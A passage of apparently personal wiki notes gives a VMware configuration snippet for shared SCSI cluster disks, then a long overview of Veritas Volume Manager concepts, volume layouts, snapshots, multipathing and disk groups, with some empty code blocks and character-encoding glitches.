      scsi1.virtualDev = &quot;lsilogic&quot;
      scsi1.sharedBus = &quot;virtua&quot; 
}}}

* Once that's done, add your Quorum Drive (making sure to specify that the drive itself uses the lsilogic bus (this was the big missing component between Karl's post for 4.5x and 5.0. I found this out by trial and error):

{{{
      scsi1:1.present = &quot;TRUE&quot;
      scsi1:1.fileName = &quot;\Quorum.vmdk&quot;
      scsi1:1.redo = &quot;&quot;
      scsi1:1.mode = &quot;independent-persistent&quot;
      scsi1:1.deviceType = &quot;disk&quot;
      scsi1:1.virtualDev = &quot;lsilogic&quot;
}}}

Once the first controller and drive is added, just add the second SCSI controller and disk (making sure to change your paths, etc.:

{{{
      scsi1:2.present = &quot;TRUE&quot;
      scsi1:2.fileName = &quot;\Resource.vmdk&quot;
      scsi1:2.virtualDev = &quot;lsilogic&quot;
      scsi1:2.redo = &quot;&quot;
      scsi1:2.mode = &quot;independent-persistent&quot;
      scsi1:2.deviceType = &quot;disk&quot;

<pre>!Daemons
* vxconfigd - The VxVM configuration daemon maintains disk and group configurations and communicates configuration changes to the kernel, and modifies configuration information stored on disks.
* vxiod - VxVM I/O kernel threads provide extended I/O operations without blocking calling processes. By default, 16 I/O threads are started at boot time, and at least one I/O thread must continue to run at all times.
* vxrelocd - The hot-relocation daemon monitors VxVM for events that affect redundancy, and performs hot-relocation to restore redundancy.

!Drivers
* VxVM Drivers:
** vxspec : Responsible for configuration changes, gathering statistics, monitoring tasks, starting kernel daemons etc.
** vxio : Is the first entry point for reading and writing VxVM volumes. All logical processing of IO operations initiates here.
** vxdmp : Is a multipathing driver and its job is to find out the various paths to the device and establish a one to many relationship between disk media (dm) and disk access(da) names.
* Volume configuration service is the interface through which all changes to the volumes are performed. Vxconfigd daemon is the sole and exclusive owner of these devices.
* Currently 8 volume conf devices exist.
** /dev/vx/[config,trace,iod,info,task,taskmon,clust,netiod].
* All these devices are character devices with major no of vxspec driver.
* All virtual disk devices (Volumes) are character and block devices with major no. of vxio driver.

!Volobject
It is a representation of all Volumes and their infrastructure that are visible to users and applications. These are kept inside kernel space. These are created once a volume is created (not always). All volobjects has their associated operation vectors that gets activated once operations are done, either by applications or vxconfigd. Volobjects are created, deleted or changed within transactions only.

Some volobjects types that are predefined in VxVM :
* Mirrored Volume (Default one). It has vol_mv_ops as Operation Vector
* Plexes. It has volplex_ops as OV.
* Subdisks. It has vol_subdisk_ops as OV.
* RVG (Replicated Volume Group) for VVR. OV is vol_rv_ops.
* Replica Object. OV is vol_rp_ops.
* Volume set. OV is vol_vset_ops.

!Staged I/O
An IO over a virtual object may in turn depend on IO over some other underlying virtual objects. Underlying virtual objects themselves handle the required operations and let the top level IO object to know the result. In this scenario the top level IO operation is broken in multiple stages where each stage also represent an IO. IO at each stage is known as SIO (Staged IO)
* SIOs are formed as a concatenation of volsio structure with any additional information needed for handling the IO.
* SIOs do not have one-to-one correspondence with KIO(Kernel I/O).
* SIOs have a hierarchical relationship.

!I/O Stabilisation
* In some OS it is possible that the application process which has issued an IO request could have the pages mmaped and could change the contents while the IO request is in flight.
* Stabilization is basically achieved by allocating a new IO buffer of same size, and IO operations will use the new buffer. Sometimes OS ensures stable buffers. 
* Mirror volumes may have multiple plexes and it is quite possible that if the IO buffer is not stable then same data will not be written in all the plexes.
* VxIO ensures that before writing to plexes it creates the copy of the original buffer and writes the data from the copied buffer.

!DDL
Device discovery is the term used to describe the process of discovering the disks that are attached to a host. This feature is important for DMP because it needs to support a growing number of disk arrays from a number of vendors. In conjunction with the ability to discover the devices attached to a host, the Device Discovery service enables you to add support dynamically for new disk arrays. This operation, which uses a facility called the Device Discovery Layer (DDL), is achieved without the need for a reboot.

!Enclosure-based Naming
Enclosure-based naming allows VxVM to access enclosures as separate physical entities.

[img[images/enclosure.png]]

In such a configuration, enclosure-based naming can be used to refer to each disk within an enclosure. For example, the device names for the disks in enclosure enc0 are named enc0_0, enc0_1, and so on.

!Objects

Virtual objects in VxVM include the following:
* Disk groups
* VM disks
* Subdisks
* Plexes
* Volumes

!!VM Disk
When you place a physical disk under VxVM control, a VM disk is assigned to the physical disk. A VM disk is under VxVM control and is usually in a disk group. Each VM disk corresponds to at least one physical disk or disk partition. VxVM allocates storage from a contiguous area of VxVM disk space.
A VM disk typically includes a public region (allocated storage) and a small private region where VxVM internal configuration information is stored.
Each VM disk has a unique disk media name (a virtual disk name). You can either define a disk name of up to 31 characters, or allow VxVM to assign a default name that takes the form diskgroup##, where diskgroup is the name of the disk group to which the disk belongs.

!!Subdisks
A subdisk is a set of contiguous disk blocks. A block is a unit of space on the disk. VxVM allocates disk space using subdisks. A VM disk can be divided into one or more subdisks. Each subdisk represents a specific portion of a VM disk, which is mapped to a specific region of a physical disk.
The default name for a VM disk is diskgroup## and the default name for a subdisk is diskgroup##-##, where diskgroup is the name of the disk group to which the disk belongs.

!!Plexes
VxVM uses subdisks to build virtual objects called plexes. A plex consists of one or more subdisks located on one or more physical disks.

[img[images/plex.png]]

You can organize data on subdisks to form a plex by using the following methods:
Understanding Veritas Volume Manager 31
How VxVM handles storage management
* concatenation
* striping (RAID-0)
* mirroring (RAID-1)
* striping with parity (RAID-5)

!!Volumes
A volume is a virtual disk device that appears to applications, databases, and file systems like a physical disk device, but does not have the physical limitations of a physical disk device. A volume consists of one or more plexes, each holding a copy of the selected data in the volume. Due to its virtual nature, a volume is not restricted to a particular disk or a specific area of a disk. The configuration of a volume can be changed by using VxVM user interfaces.

VxVM uses the default naming conventions of vol## for volumes and vol##-## for plexes in a volume.

A volume may be created under the following constraints:
* Its name can contain up to 31 characters.
* It can consist of up to 32 plexes, each of which contains one or more subdisks.
* It must have at least one associated plex that has a complete copy of the data in the volume with at least one associated subdisk.
* All subdisks within a volume must belong to the same disk group.

[img[images/mirrored.plex.png]]

Volume vol06 has the following characteristics:
* It contains two plexes named vol06-01 and vol06-02.
* Each plex contains one subdisk.
* Each subdisk is allocated from a different VM disk (disk01 and disk02).

!Volume Layout
A VxVM virtual device is defined by a volume. A volume has a layout defined by the association of a volume to one or more plexes, each of which map to subdisks. A VxVM virtual device is defined by a volume. A volume has a layout defined by the association of a volume to one or more plexes, each of which map to subdisks.

!!!For non-layered volumes
In a non-layered volume, a subdisk is restricted to mapping directly to a VM disk. This allows the subdisk to define a contiguous extent of storage space backed by the public region of a VM disk. When active, the VM disk is directly associated with an underlying physical disk. The combination of a volume layout and the physical disks therefore determines the storage service available from a given virtual device.

!!!For Layered volumes
A layered volume is constructed by mapping its subdisks to underlying volumes. The subdisks in the underlying volumes must map to VM disks, and hence to attached physical storage.

!!!Layout Methods
Data in virtual objects is organized to create volumes by using the following layout methods:
* Concatenation and spanning
* Striping (RAID-0)
* Mirroring (RAID-1)
* Striping plus mirroring (mirrored-stripe or RAID-0+1)
* Mirroring plus striping (striped-mirror, RAID-1+0 or RAID-10)
* RAID-5 (striping with parity)

Concatenation maps data in a linear manner onto one or more subdisks in a plex. To access all of the data in a concatenated plex sequentially, data is first accessed in the first subdisk from beginning to end. Concatenation using subdisks that reside on more than one VM disk is called spanning.

Striping (RAID-0) is useful if you need large amounts of data written to or read from physical disks, and performance is important. Striping maps data so that the data is interleaved among two or more physical disks. A striped plex contains two or more subdisks, spread out over two or more physical disks. Data is allocated alternately and evenly to the subdisks of a striped plex. The default stripe unit size (or width) is 64 kilobytes. Striping continues for the length of the columns (if all columns are the same length), or until the end of the shortest column is reached. Any space remaining at the end of subdisks in longer columns becomes unused space.
Each column contains a different number of subdisks. There is one column per physical disk. Striped plexes can be created by using a single subdisk from each of the VM disks being striped across. It is also possible to allocate space from different regions of the same disk or from another disk (for example, if the size of the plex is increased). Columns can also contain subdisks from different VM disks.

[img[images/striped.plex.png]]

[question why is it required that subdisks for striped plex come from different vm disks]

Mirroring uses multiple mirrors (plexes) to duplicate the information contained in a volume. In the event of a physical disk failure, the plex on the failed disk becomes unavailable, but the system continues to operate using the unaffected mirrors.
When striping or spanning across a large number of disks, failure of any one of those disks can make the entire plex unusable. Because the likelihood of one out of several disks failing is reasonably high, you should consider mirroring to improve the reliability (and availability) of a striped or spanned volume.

VxVM supports the combination of mirroring above striping. The combined layout is called a mirrored-stripe layout. A mirrored-stripe layout offers the dual benefits of striping to spread data across multiple disks, while mirroring provides redundancy of data.
For mirroring above striping to be effective, the striped plex and its mirrors must be allocated from separate disks.
The layout type of the data plexes in a mirror can be concatenated or striped. Even if only one is striped, the volume is still termed a mirrored-stripe volume. If they are all concatenated, the volume is termed a mirrored-concatenated volume.

[img[images/mirrored.stripe.png]]

VxVM supports the combination of striping above mirroring. This combined layout is called a striped-mirror layout. Putting mirroring below striping mirrors each column of the stripe. If there are multiple subdisks per column, each subdisk can be mirrored individually instead of each column.
A striped-mirror volume is an example of a layered volume. See âLayered volumesâ on page 50 for more information.
As for a mirrored-stripe volume, a striped-mirror volume offers the dual benefits of striping to spread data across multiple disks, while mirroring provides redundancy of data. In addition, it enhances redundancy, and reduces recovery time after disk failure.
Figure 1-19 shows an example where a striped-mirror volume is created by using each of three existing 2-disk mirrored volumes to form a separate column within a striped plex.
If the layered volume concatenates instead of striping the underlying mirrored volumes, the volume is termed a concatenated-mirror volume.

[img[images/striped.mirror.png]]

Note: VxVM supports RAID-5 for private disk groups, but not for shareable disk groups in a cluster environment. In addition, VxVM does not support the mirroring of RAID-5 volumes that are configured using Veritas Volume Manager software. Disk devices that support RAID-5 in hardware may be mirrored.

!!!!RAID-5 logging
Logging is used to prevent corruption of data during recovery by immediately recording changes to data and parity to a log area on a persistent device such as a volume on disk or in non-volatile RAM. The new data and parity are then written to the disks.
Without logging, it is possible for data not involved in any active writes to be lost or silently corrupted if both a disk in a RAID-5 volume and the system fail. If this double-failure occurs, there is no way of knowing if the data being written to the data portions of the disks or the parity being written to the parity portions have actually been written. Therefore, the recovery of the corrupted disk may be corrupted itself.

!!!Layered Volume
A layered volume is a virtual Veritas Volume Manager object that is built on top of other volumes. The layered volume structure tolerates failure better and has greater redundancy than the standard volume structure. For example, in a striped-mirror layered volume, each mirror (plex) covers a smaller area of storage space, so recovery is quicker than with a standard mirrored volume.

[img[images/layered.volume.png]]

!Online Relayout
Online relayout allows you to convert between storage layouts in VxVM, with uninterrupted data access. 
The transformation is done by moving one portion of data at a time in the source layout to the destination layout. Data is copied from the source volume to the temporary area, and data is removed from the source volume storage area in portions.The source volume storage area is then transformed to the new layout, and the data saved in the temporary area is written back to the new layout. This operation is repeated until all the storage and data in the source volume has been transformed to the new layout.
As well as the temporary area, space is required for a temporary intermediate volume when increasing the column length of a striped volume. The amount of space required is the difference between the column lengths of the target and source volumes. For example, 20GB of temporary additional space is required to relayout a 150GB striped volume with 5 columns of length 30GB as 3 columns of length 50GB. In some cases, the amount of temporary space that is required is relatively large. For example, a relayout of a 150GB striped volume with 5 columns as a concatenated volume (with effectively one column) requires 120GB of space for the intermediate volume.

Limitations of online relayout
Note the following limitations of online relayout:
* Log plexes cannot be transformed.
* Volume snapshots cannot be taken when there is an online relayout operation running on the volume.
* Online relayout cannot create a non-layered mirrored volume in a single step. It always creates a layered mirrored volume even if you specify a non-layered mirrored layout, such as mirror-stripe or mirror-concat. Use the vxassistconvert command to turn the layered mirrored volume that results from a relayout into a non-layered volume. See âConverting between layered and non-layered volumesâ on page 308 for more information.
* Online relayout can be used only with volumes that have been created using the vxassist command or the Veritas Enterprise Administrator (VEA).
* The usual restrictions apply for the minimum number of physical disks that are required to create the destination layout. For example, mirrored volumes require at least as many disks as mirrors, striped and RAID-5 volumes require at least as many disks as columns, and striped-mirror volumes require at least as many disks as columns multiplied by mirrors.
* To be eligible for layout transformation, the plexes in a mirrored volume must have identical stripe widths and numbers of columns. Relayout is not possible unless you make the layouts of the individual plexes identical.
* Online relayout involving RAID-5 volumes is not supported for shareable disk groups in a cluster environment.
* Online relayout cannot transform sparse plexes, nor can it make any plex sparse. (A sparse plex is not the same size as the volume, or has regions that are not mapped to any subdisk.)
* The number of mirrors in a mirrored volume cannot be changed using relayout.
* Only one relayout may be applied to a volume at a time.

!Volume resynchronization
When storing data redundantly and using mirrored or RAID-5 volumes, VxVM ensures that all copies of the data match exactly. However, under certain conditions (usually due to complete system failures), some redundant data on a volume can become inconsistent or unsynchronized. The mirrored data is not exactly the same as the original data. Except for normal configuration changes (such as detaching and reattaching a plex), this can only occur when a system crashes while data is being written to a volume.

VxVM records when a volume is first written to and marks it as dirty. When a volume is closed by all processes or stopped cleanly by the administrator, and all writes have been completed, VxVM removes the dirty flag for the volume. Only volumes that are marked dirty when the system reboots require resynchronization.

The process of resynchronization depends on the type of volume. RAID-5 volumes that contain RAID-5 logs can âreplayâ those logs. If no logs are available, the volume is placed in reconstruct-recovery mode and all parity is regenerated. For mirrored volumes, resynchronization is done by placing the volume in recovery mode (also called read-writeback recovery mode).

For large volumes or for a large number of volumes, the resynchronization process can take time. These effects can be addressed by using dirty region logging (DRL) and FastResync (fast mirror resynchronization) for mirrored volumes, or by ensuring that RAID-5 volumes have valid RAID-5 logs. For raw volumes used by database applications, the SmartSync feature can be used if this is supported by the database vendor.

!!!Dirty Region Logging
Dirty region logging (DRL), if enabled, speeds recovery of mirrored volumes after a system crash. DRL keeps track of the regions that have changed due to I/ O writes to a mirrored volume. DRL uses this information to recover only those portions of the volume that need to be recovered.
DRL logically divides a volume into a set of consecutive regions, and maintains a log on disk where each region is represented by a status bit. This log records regions of a volume for which writes are pending. Before data is written to a region, DRL synchronously marks the corresponding status bit in the log as dirty. To enhance performance, the log bit remains set to dirty until the region becomes the least recently accessed for writes.

DRL log subdisks store the dirty region log of a mirrored volume that has DRL enabled. A volume with DRL has at least one log subdisk; multiple log subdisks can be used to mirror the dirty region log. Each log subdisk is associated with one plex of the volume. Only one log subdisk can exist per plex. If the plex contains only a log subdisk and no data subdisks, that plex is referred to as a log plex.
The log subdisk can also be associated with a regular plex that contains data subdisks. In that case, the log subdisk risks becoming unavailable if the plex must be detached due to the failure of one of its data subdisks.
Some volumes, such as those that are used for database replay logs, are written sequentially and do not benefit from delayed cleaning of the DRL bits. For these volumes, sequential DRL can be used to limit the number of dirty regions. This allows for faster recovery should a crash occur. However, if applied to volumes that are written to randomly, sequential DRL can be a performance bottleneck as it limits the number of parallel writes that can be carried out.

!!!Smartsync recovery accelerator
The SmartSync feature of Veritas Volume Manager increases the availability of mirrored volumes by only resynchronizing changed data. (The process of resynchronizing mirrored databases is also sometimes referred to as resilvering.) SmartSync reduces the time required to restore consistency, freeing more I/O bandwidth for business-critical applications. If supported by the database vendor, the SmartSync feature uses an extended interface between VxVM volumes and the database software to avoid unnecessary work during mirror resynchronization. For example, OracleÂ® automatically takes advantage of SmartSync to perform database resynchronization when it is available.
The SmartSync feature of Veritas Volume Manager is only applicable to databases that are configured on raw volumes. You cannot use it with volumes that contain file systems. Use an alternative solution such as the Oracle Resilvering feature of Veritas File System (VxFS).

You must configure volumes correctly to use SmartSync. For VxVM, there are two types of volumes used by the database, as follows:
* Data volumes are all other volumes used by the database (control files and tablespace files).
* Redo log volumes contain redo logs of the database.
SmartSync works with these two types of volumes differently, so they must be configured as described in the following sections.

Because the database keeps its own logs, it is not necessary for VxVM to do logging. Data volumes should be configured as mirrored volumes without dirty region logs. 
A redo log is a log of changes to the database data. Because the database does not maintain changes to the redo logs, it cannot provide information about which sections require resilvering.The enhanced interfaces for redo logs allow the database software to inform VxVM when a volume is to be used as a redo log. This allows VxVM to modify the DRL behavior of the volume to take advantage of the access patterns.

!Volume Snapshots
The traditional type of volume snapshot in VxVM is of the third-mirror break-off type. This name comes from its implementation where a snapshot plex (or third mirror) is added to a mirrored volume. The contents of the snapshot plex are then synchronized from the original plexes of the volume. When this synchronization is complete, the snapshot plex can be detached as a snapshot volume for use in backup or decision support applications. At a later time, the snapshot plex can be reattached to the original volume, requiring a full resynchronization of the snapshot plexâs contents. 
The FastResync feature was introduced to track writes to the original volume. This tracking means that only a partial, and therefore much faster, resynchronization is required on reattaching the snapshot plex. In later releases, the snapshot model was enhanced to allow snapshot volumes to contain more than a single plex, reattachment of a subset of a snapshot volumeâs plexes, and persistence of FastResync across system reboots or cluster restarts.

Release 4.0 of VxVM introduced full-sized instant snapshots and space-optimized instant snapshots, which offer advantages over traditional third-mirror snapshots such as immediate availability and easier configuration and administration. You can also use the third-mirror break-off usage model with full-sized snapshots, where this is necessary for write-intensive applications

|Snapshot feature |Full-sized instant (vxsnap) |Space-optimized instant (vxsnap) |Break-off (vxassist or vxsnap)|
|Immediately available for use on creation |Yes |Yes |No|
|Requires less storage space than original volume |No |Yes |No|
|Can be reattached to original volume |Yes |No |Yes|
|Can be used to restore contents of original volume |Yes |Yes |Yes|
|Can quickly be refreshed without being reattached |Yes |Yes |No|
|Snapshot hierarchy can be split |Yes |No |No|
|Can be moved into separate disk group from original volume |Yes |No |Yes|
|Can be turned into an independent volume |Yes |No |Yes|
|FastResync ability persists across system reboots or cluster restarts |Yes |Yes |Yes|
|Synchronization can be controlled|Yes|No| No|

!Fast Resync
FastResync optimizes mirror resynchronization by keeping track of updates to stored data that have been missed by a mirror. When a mirror returns to service, only the updates that it has missed need to be re-applied to resynchronize it.
FastResync allows you to refresh and re-use snapshots rather than discard them. You can quickly re-associate (snapback) snapshot plexes with their original volumes.

Non-persistent FastResync allocates its change maps in memory. If non-persistent FastResync is enabled, a separate FastResync map is kept for the original volume and for each snapshot volume. Unlike a dirty region log (DRL), they do not reside on disk nor in persistent store. This has the advantage that updates to the FastResync map have little impact on I/O performance, as no disk updates needed to be performed. However, if a system is rebooted, the information in the map is lost, so a full resynchronization is required on snapback. This limitation can be overcome for volumes in cluster-shareable disk groups, provided that at least one of the nodes in the cluster remained running to preserve the FastResync map in its memory. However, a node crash in a High Availability (HA) environment requires the full resynchronization of a mirror when it is reattached to its parent volume.

The snapshot feature of VxVM takes advantage of FastResync change tracking to record updates to the original volume after a snapshot plex is created. After a snapshot is taken, the snapback option is used to reattach the snapshot plex.

If persistent FastResync is enabled on a volume or on a snapshot volume, a data change object (DCO) and a DCO volume are associated with the volume.

The internal layout of the DCO volume changed in VxVM 4.0 to support new features such as full-sized and space-optimized instant snapshots. Because the DCO volume layout is versioned, VxVM software continues to support the version 0 layout for legacy volumes. However, you must configure a volume to have a version 20 DCO volume if you want to take instant snapshots of the volume.

In VxVM release 3.2, the DCO object only managed information about the FastResync maps. These maps track writes to the original volume and to each of up to 32 snapshot volumes since the last snapshot operation. Each plex of the DCO volume on disk holds 33 maps, each of which is 4 blocks in size by default.

In VxVM 4.0 and later releases, the DCO object is used not only to manage the FastResync maps, but also to manage DRL recovery maps (see âDirty region loggingâ on page 59) and special maps called copymaps that allow instant snapshot operations to resume correctly following a system crash. 

The layout of a version 20 DCO volume includes an accumulator that stores the DRL map and a per-region state map for the volume, plus 32 per-volume maps (by default) including a DRL recovery map, and a map for tracking detaches that are initiated by the kernel due to I/O error. The remaining 30 per-volume maps (by default) are used either for tracking writes to snapshots, or as copymaps.

!Hot Relocation
VxVM detects I/O failures on objects and relocates the affected subdisks. The subdisks are relocated to disks designated as spare disks and/or free space within the disk group. VxVM then reconstructs the objects that existed before the failure and makes them accessible again.
When a partial disk failure occurs (that is, a failure affecting only some subdisks on a disk), redundant data on the failed portion of the disk is relocated. Existing volumes on the unaffected portions of the disk remain accessible.

!Volume sets
Volume sets are an enhancement to VxVM that allow several volumes to be represented by a single logical object. All I/O from and to the underlying volumes is directed via the I/O interfaces of the volume set. The volume set feature supports the multi-volume enhancement to Veritas File System (VxFS). This feature allows file systems to make best use of the different performance and availability characteristics of the underlying volumes. For example, file system metadata could be stored on volumes with higher redundancy, and user data on volumes with better performance.

!Disk Naming
There are two different methods of naming disk devices:
* hdx and sdx based naming
* Enclosure based naming

!!!!hdx and sdx based namingâ¬
In this naming scheme, all disk devices are named using the hdx[N] or sdx[N] format, where x is a letter that indicates the order of EIDE (hd) or SCSI (sd) disks seen by the operating system, and N is an optional partition number in the range 1 through 15.

!!!!Enclosure Based Naming
Enclosure-based naming operates as follows:
* Devices with very long device names (for example, Fibre Channel devices that include worldwide name (WWN) identifiers) are always represented by enclosure-based names.
* All disks in supported disk arrays are named using the enclosure_name_# format. For example, disks in the supported disk array, enggdept are named enggdept_0, enggdept_1, enggdept_2 and so on. 
* Disks in the DISKS category (JBOD disks) are named using the Disk_# format.
* A disk partition is indicated by appending s# to the name, where # is the partition number. For example, Disk_0s5 and Disk_0s6 indicate the extended partitions that are used for the private and public regions of the sliced disk, Disk_0.
* Disks in the OTHER_DISKS category (disks that are not multipathed by DMP) cannot use this scheme, and are named using the hdx[N] or sdx[N] format.

!Disk Regions
Most VM disks have two regions:

!!!!private region 
A small area where configuration information is stored. A disk header label, configuration records for VxVM objects (such as volumes, plexes and subdisks), and an intent log for the configuration database are stored here. The default private region size is 32 megabytes, which is large enough to record the details of several thousand VxVM objects in a disk group.
Each disk that has a private region holds an entire copy of the configuration database for the disk group. The size of the configuration database for a disk group is limited by the size of the smallest copy of the configuration database on any of its member disks.

!!!!public region 
An area that covers the remainder of the disk, and which is used for the allocation of storage space to subdisks

!Disk Typ
A disk's type identifies how VxVM accesses a disk, and how it manages the disk's private and public regions. The following disk access types are used by VxVM:

!!!!simple
The public and private regions are both configured on a single extended partition, such as partition 5, with the public area following the private area. The partition number (displayed as # or s#, depending on the naming scheme) is always displayed in command output for simple disks.

!!!!sliced
The private and public regions are configured on different extended partitions: partition 5 for the private region, and partition 6 for the public region.

!!!!nopriv
There is no private region (only a public region for allocating subdisks). This is the simplest disk type consisting only of space for allocating subdisks. Such disks are most useful for defining special devices (such as RAM disks, if supported) on which private region data would not persist between reboots. They can also be used to encapsulate disks where there is insufficient room for a private region. 

!!!!auto 
When the vxconfigd daemon is started, VxVM obtains a list of known disk device addresses from the operating system and configures disk access records for them automatically.

Auto-configured disks (with disk access type auto) support the following disk formats:
* cdsdisk - The disk is formatted as a Cross-platform Data Sharing (CDS) disk that is suitable for moving between different operating systems. This is the default format for disks that are not used to boot the system.Typically, most disks on a system are configured as this disk type. However, it is not a suitable format for boot, root or swap disks, for mirrors or hot-relocation spares of such disks, or for Extensible Firmware Interface (EFI) disks. Also note that partition 3 is used for both the private and public regions of a CDS disk.
* simple - The disk is formatted as a simple disk that can be converted to a CDS disk.
* sliced - The disk is formatted as a sliced disk. This format can be applied to disks that are used to boot the system. The disk can be converted to a CDS disk if it was not initialized for use as a boot disk.

!Discovering new devices
vxdisk scandisks or vxdctl enable command can be used to discover devices. The commands also trigger chnages in DMP configuration. 
{{{

To encapsulate a disk 
* The disk should have atleast 2 partitions one for storing private region, other for public.
* The private region would require 32MB of free space at the start or end of the disk. 
Follow the prompts in vxdiskadm to encapsulate a disk 

nopriv disk can be used to encapsulate a partition for use with VxVM
{{{

If a LUN expanded/shrunk on the array side, VxVM can be asked identify the new size. Size changes should be done only at the last byte of the lun not the first byte. If a shrink can be accomodated without any disrupion to plexes the shrink is performed. 
To notify VxVM of expand/shrink to a LUN
{{{

!Extended Copy service
The Extended Copy Service feature of VxVM works in tandem with the extended copy engines from array vendors. When VxVM detects that the source and destination devices are enabled for extended copy, VxVM automatically off loads copy requests to the arrayâs copy manager.

To see whether the Extended Copy Service feature is enabled on a disk, use the
vxprint command as shown in the following example. The feature is enabled if
an ecopy_enabled entry appears in the flags line.
{{{

!DMP

Array types are
!!!Active/Active
An Active/Active disk array (A/A arrays) permits several paths to be used concurrently for I/O. In the event that one path fails, DMP automatically routes I/O over the other available paths.
A/A-A or Asymmetric Active/Active arrays can be accessed through secondary storage paths with little performance degradation. Usually an A/A-A array behaves like an A/P array rather than an A/A array. However, during failover, an A/A-A array behaves like an A/A array.

!!!Active/Passive
An Active/Passive array (A/P array) allows access to its LUNs via the primary (active) path on a single controller (also known as an access port or a storage processor) during normal operation.
In implicit failover mode (or autotrespass mode), an A/P array automatically fails over by scheduling I/O to the secondary (passive) path on a separate controller if the primary path fails. This passive port is not used for I/O until the active port fails. In A/P arrays, path failover can occur for a single LUN if I/O fails on the primary path.
For Active/Passive arrays with LUN group failover (A/PG arrays), a group of LUNs that are connected through a controller is treated as a single failover entity. Unlike A/P arrays, failover occurs at the controller level, and not for individual LUNs. The primary and secondary controller are each connected to a separate group of LUNs. If a single LUN in the primary controllerâs LUN group fails, all LUNs in that group fail over to the secondary controller.
Active/Passive arrays in explicit failover mode (or non-autotrespass mode) are termed A/PF arrays. DMP issues the appropriate low-level command to make the LUNs fail over to the secondary path.
A/P-C, A/PF-C and A/PG-C arrays are variants of the A/P, AP/F and A/PG array types that support concurrent I/O and load balancing by having multiple primary paths into a controller. This functionality is provided by a controller with multiple ports, or by the insertion of a SAN hub or switch between an array and a controller. Failover to the secondary (passive) path occurs only if all the active primary paths fail.

!!!Load Balancing
For Active/Passive disk arrays, I/O is sent down the primary path. If the primary path fails, I/O is switched over to the other available primary paths or secondary paths. As the continuous transfer of ownership of LUNs from one controller to another results in severe I/O slowdown, load balancing across paths is not performed for Active/Passive disk arrays unless they support concurrent I/O.
Both paths of an Active/Passive array are not considered to be on different controllers when mirroring across controllers (for example, when creating a volume using vxassistmake specified with the mirror=ctlr attribute).
For A/P-C, A/PF-C and A/PG-C arrays, load balancing is performed across all the currently active paths as is done for Active/Active arrays.


!!!DMP Monitoring
DMP maintains a pool of kernel threads that are used to perform such tasks as error processing, path restoration, statistics collection, and SCSI request callbacks. The vxdmpadmstat command can be used to provide information about the threads. The names errord and restored have been retained for backward compatibility.
One kernel thread responds to I/O failures on a path by initiating a probe of the host bus adapter (HBA) that corresponds to the path. Another thread then takes the appropriate action according to the response from the HBA. The action taken can be to retry the I/O request on the path, or to fail the path and reschedule the I/O on an alternate path.
The restore kernel thread is woken periodically (typically every 5 minutes) to check the health of the paths, and to resume I/O on paths that have been restored. As some paths may suffer from intermittent failure, I/O is only resumed on a path if has remained healthy for a given period of time.

!!!I/O Throttling
If I/O throttling is enabled, and the number of outstanding I/O requests builds up on a path that has become less responsive, DMP can be configured to prevent new I/O requests being sent on the path either when the number of outstanding I/O requests has reached a given value, or a given time has elapsed since the last successful I/O request on the path. While throttling is applied to a path, the outstanding I/O requests on that path are scheduled on other available paths. The throttling is removed from the path if the HBA reports no error on the path, or if an outstanding I/O request on the path succeeds

!!!DMP in clustered environment
In a clustered environment where Active/Passive type disk arrays are shared by multiple hosts, all nodes in the cluster must access the disk via the same physical path. Accessing a disk via multiple paths simultaneously can severely degrade I/O performance (sometimes referred to as the ping-pong effect). Path failover on a single cluster node is also coordinated across the cluster so that all the nodes continue to share the same physical path.
For Active/Active type disk arrays, any disk can be simultaneously accessed through all available physical paths to it. In a clustered environment, the nodes do not all need to access a disk via the same physical path.

!!!Enabling/Disabling I/O to controller/ports/SPs/paths
DMP allows you to turn off I/O for a controller or the array port of a storage processor so that you can perform administrative operations. This feature can be used for maintenance of HBA controllers on the host, or array ports that are attached to disk arrays supported by VxVM. I/O operations to the controller or array port can be turned back on after the maintenance task is completed. You can accomplish these operations using the vxdmpadm command provided with VxVM.
In Active/Active type disk arrays, VxVM uses a balanced path mechanism to schedule I/O to multipathed disks. As a result, I/O may go through any available path at any given point in time. For example, if a system has an Active/Active storage array, and you need to change an interface board that is connected to this disk array (if supported by the hardware), you can use the vxdmpadm command to list the controllers that are connected to the interface board. Disable the controllers to stop further I/O to the disks that are accessed through the interface board. You can then replace the board without causing disruption to any ongoing I/O to disks in the disk array.
In Active/Passive type disk arrays, VxVM schedules I/O to use the primary path until a failure is encountered. To change the interface card for an array port or an HBA controller card on the host (if supported by the hardware) that is connected to the disk array, disable I/O operations to the array port or to the HBA controller. This shifts all I/O over to an active secondary path or to an active primary path on another controller so that you can change the hardware.
After the operation is over, you can use vxdmpadm to re-enable the paths through the controllers.

!Disk groups
Disk groups are named collections of disks that share a common configuration. Volumes are created within a disk group and are restricted to using disks within that disk group.
When a disk is added to a disk group, it is given a name (for example, mydg02). This name identifies a disk for operations such as volume creation or mirroring. The name also relates directly to the underlying physical disk. If a physical disk is moved to a different target address or to a different controller, the name mydg02 continues to refer to it.
Having disk groups that contain many disks and VxVM objects causes the private region to fill. In the case of large disk groups that are expected to contain more than several hundred disks and VxVM objects, disks should be set up with larger private areas. A major portion of a private region provides space for a disk group configuration database that contains records for each VxVM object in that disk group. Because each configuration record takes up approximately 256 bytes, the number of records that can be created in a disk group can be estimated from the configuration database copy size. The copy size in blocks can be obtained from the output of the command vxdglist diskgroup as the value of the permlen parameter on the line starting with the string âconfig:â. This value is the smallest of the len values for all copies of the configuration database in the disk group. The amount of remaining free space in the configuration database is shown as the value of the free parameter.

!!!Reserved disk group names
* bootdg - To get 'vxdg bootdg'.
* defaultdg - To get, 'vxdg defaultdg'. To set 'vxdctl defaultdg &lt;dg_name&gt;
* nodg - Specifies to an operation that no disk group has been defined. For example, if the root disk is not under VxVM control, bootdg is set to nodg. By default, defaultdg is set to nodg.

!Minor number allocation in VxVM
VxVM assigns unique device minor numbers to each object (volume, plex, subdisk, disk, or disk group) that it controls. When you move a disk group between systems, it is possible for the minor numbers that it used on its previous system to coincide (or collide) with those of objects known to VxVM on the new system. To get around this potential problem, you can allocate separate ranges of minor numbers for each disk group. 

VxVM chooses minor device numbers for objects created from this disk group starting at the base minor number base_minor. Minor numbers can range from this value up to 65,535 on 2.6 and later kernels. VxVM reserves the range of minor numbers from 0 to 999 for use with volumes in the boot disk group.  If you do not specify the base of the minor number range for a disk group, VxVM chooses one at random. The number chosen is at least 1000, is a multiple of 1000, and yields a usable range of 1000 device numbers.

{{{
# To view the base minor number for an existing disk group
vxprint -l mydg | egrep minors
minors: &gt;=45000
vxprint -g mydg -m | egrep base_minor
base_minor=45000

# To set a base volume device minor number for a disk grou
vxdg init diskgroup minor=base_minor disk_access_name ...

